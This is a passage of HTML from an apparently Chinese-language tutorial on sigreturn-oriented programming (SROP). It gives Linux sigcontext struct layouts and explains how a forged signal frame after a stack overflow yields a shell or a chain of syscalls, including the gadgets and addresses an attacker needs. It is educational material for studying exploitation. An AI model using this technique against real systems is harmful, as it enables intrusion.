class=\"keyword\">long</span> ecx;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> eax;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> trapno;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> err;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> eip;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> cs, __csh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> eflags;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> esp_at_signal;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> ss, __ssh;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> oldmask;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> cr2;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>x64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        cwd;</span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        swd;</span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        ftw;</span><br><span class=\"line\">  <span class=\"keyword\">__uint16_t</span>        fop;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span>        rip;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span>        rdp;</span><br><span class=\"line\">  <span class=\"keyword\">__uint32_t</span>        mxcsr;</span><br><span class=\"line\">  <span class=\"keyword\">__uint32_t</span>        mxcr_mask;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpxreg</span>    _<span class=\"title\">st</span>[8];</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">xmmreg</span>    _<span class=\"title\">xmm</span>[16];</span></span><br><span class=\"line\">  <span class=\"keyword\">__uint32_t</span>        padding[<span class=\"number\">24</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r8;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r9;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r10;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r11;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r12;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r13;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r14;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r15;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rdi;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rsi;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rbp;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rbx;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rdx;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rax;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rcx;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rsp;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rip;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> eflags;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> cs;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> gs;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> fs;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> __pad0;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> err;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> trapno;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> oldmask;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> cr2;</span><br><span class=\"line\">  __extension__ <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">      <span class=\"keyword\">__uint64_t</span> __fpstate_word;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> __reserved1 [<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>signal     handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</p>\n<p><strong>攻击原理</strong></p>\n<p>仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：</p>\n<ul>\n<li>Signal  Frame被保存在用户的地址空间中，所以用户是可以读写的。</li>\n<li>由于内核与信号处理程序无关(kernel     agnostic about signal handlers)，它并不会去记录这个signal对应的Signal     Frame，所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。</li>\n</ul>\n<p>说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。</p>\n<p><strong>获取shell</strong></p>\n<p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</p>\n<p>当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。</p>\n<p><strong>system call chains</strong></p>\n<p>需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>\n<ul>\n<li><strong>控制栈指针。</strong></li>\n<li><strong>把原来rip指向的syscall     gadget换成syscall; ret gadget。</strong></li>\n</ul>\n<p>如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。</p>\n<p><strong>后续</strong></p>\n<p>需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件</p>\n<ul>\n<li><p><strong>可以通过栈溢出来控制栈的内容</strong></p>\n</li>\n<li><p><strong>需要知道相应的地址</strong></p>\n</li>\n<li><ul>\n<li><strong>“/bin/sh”</strong></li>\n<li><strong>Signal      Frame</strong></li>\n<li><strong>syscal</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li><p>需要有够大的空间来塞下整个sigal     frame</p>\n</li>\n</ul>\n<p>此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：</p>\n<p>并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说Linux &lt; 3.3 x86_64（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&amp;return代码片段。如下</p>\n<p><img src=\"data:image/png;base64,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WpeKwhrpFxERERHZA28pS9fJZfz5yj2Y8BMHFEREREQ3Ow4qyMbycObfLzFtQDsMmrsPmbxTKhEREdFNj6c/UTWo4OQVgID6jnC49pAICvOu4ELqWaRbM88FEREREd1wOKggIiIiIiKr8PQnIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4aCCiIiIiIiswkEFERERERFZhYMKIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrKKxt4dICIi2+gIQGfvTtzijgM4b+9OEBHZAQcVREQ3gT8A3G7vThAKADwAYIO9O0JEVMN4+hMR0Q2uDTigqC00AB6zdyeIiOyAgwoiohuck707QOU427sDRER2wNOfiIhuMn0BnLR3J24xiwHcY+9OEBHZEQcVREQ3mbPFQTWH65uIbnU8/YmIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4eR3RERERFTj1O4t0LmtNzRXk3HwwClkFdm7R2SNWjCoUEHXvB9GDQ9DSy8dtKocHP58LlYfySmfpWuOfqOGI6ylF3RaFXIOf46Zq48wx4IcjXsgOgY3g1vBeRw7cBjJ2RU+vSpn+HUIRWuPPCRGRyI+owBGaluOzamh0aqhQhEK9AUov4ac4N0uFO0bOyLrRDT2x1+C7XukgkarMX0IsagQBQWFsP13rgrOfh0Q2toDeYnRiIzPqP5yadwR2DEYzdwKcP7YARxOzq7QX1vVUtJOTdYCVM5+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